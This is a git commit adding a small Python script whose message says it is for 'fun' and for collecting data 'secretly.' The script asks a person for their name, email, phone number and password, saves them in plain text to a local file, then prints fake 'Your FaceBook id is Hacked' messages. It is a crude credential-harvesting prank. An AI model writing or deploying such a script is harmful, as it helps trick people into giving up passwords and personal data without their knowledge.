521680721579e546160e019eead7028aafa4e18b
Little-Boss <99569534+Little-Boss-Tahmid@users.noreply.github.com>
2023-06-18 16:07:22 +0600

    try.py
    It is made for fun . You can collect or save data secretly.

---
+++ try.py
@@ -0,0 +1,24 @@
+while True:
+    N = input("\n\n\n\n\nEnter your full name :")
+    E = input("Enter your email address :")
+    M = input("Enter your mobile number :")
+    P = input("Enter your password :")
+
+    file1 = '[1]~~~Full name :'+N
+    file2 = '[2]~~~Email address : '+ E
+    file3 = '[3]~~~Mobile number :'+M
+    file4 = '[4]~~~Password :'+P
+
+    Files = file1+'\n\n'+file2+'\n\n'+file3+'\n\n'+file4+'\n\n'
+
+    with open(N+".txt","w")as f:
+         f.write(Files)
+
+    Ncount = 1
+    while Ncount < 18278912678:
+          print (Ncount)
+          Ncount = Ncount + 100000
+          if Ncount > 18278912678:
+             print("          ♠ I Hacked your FaceBook id ♠")
+          else:
+            print("            :Your FaceBook id is Hacked ")     
